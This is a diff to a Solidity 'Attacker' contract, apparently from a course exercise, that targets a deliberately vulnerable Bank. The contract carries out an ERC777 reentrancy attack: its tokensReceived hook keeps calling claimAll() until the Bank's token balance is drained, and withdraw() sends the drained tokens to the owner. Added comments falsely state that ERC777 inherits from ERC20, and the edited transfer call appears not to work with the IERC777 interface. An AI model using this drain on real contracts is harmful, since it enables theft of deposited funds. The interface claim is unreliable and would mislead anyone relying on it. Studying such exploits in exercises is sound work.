@@ -2,20 +2,17 @@
 pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
+import "@openzeppelin/contracts/token/ERC777/IERC777.sol"; // <-- ADDED
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 /**
  * @title IBank
  * @dev Interface for the vulnerable Bank contract.
- * Based on the assignment description, it must have:
- * - A `deposit()` function to deposit ETH.
- * - A `claimAll()` function which is the vulnerable ERC777 withdrawal function.
- * - A way to get the address of the ERC777 token, assumed to be `token()`.
  */
 interface IBank {
     function deposit() external payable;
     function claimAll() external;
-    function token() external view returns (IERC20);
+    function token() external view returns (IERC777); // <-- CHANGED from IERC20
 }
 
 /**
@@ -28,7 +25,7 @@ interface IBank {
 contract Attacker is IERC777Recipient {
     address public owner;
     IBank public target; // The vulnerable Bank contract
-    IERC20 public token; // The ERC777 token from the Bank
+    IERC777 public token; // <-- CHANGED from IERC20
 
     constructor() {
         owner = msg.sender;
@@ -78,8 +75,7 @@ contract Attacker is IERC777Recipient {
     ) external override {
         // As long as the Bank contract still holds more of its own tokens,
         // we recursively call `claimAll()` to drain it.
-        // This check prevents the transaction from reverting due to
-        // an infinite loop or running out of gas after the bank is empty.
+        // The token.balanceOf function is available as ERC777 inherits from ERC20
         if (token.balanceOf(address(target)) > 0) {
             target.claimAll();
         }
@@ -93,6 +89,7 @@ contract Attacker is IERC777Recipient {
     function withdraw() public {
         require(msg.sender == owner, "Only owner can withdraw");
         uint256 balance = token.balanceOf(address(this));
+        // The token.transfer function is available as ERC777 inherits from ERC20
         token.transfer(owner, balance);
     }
 }
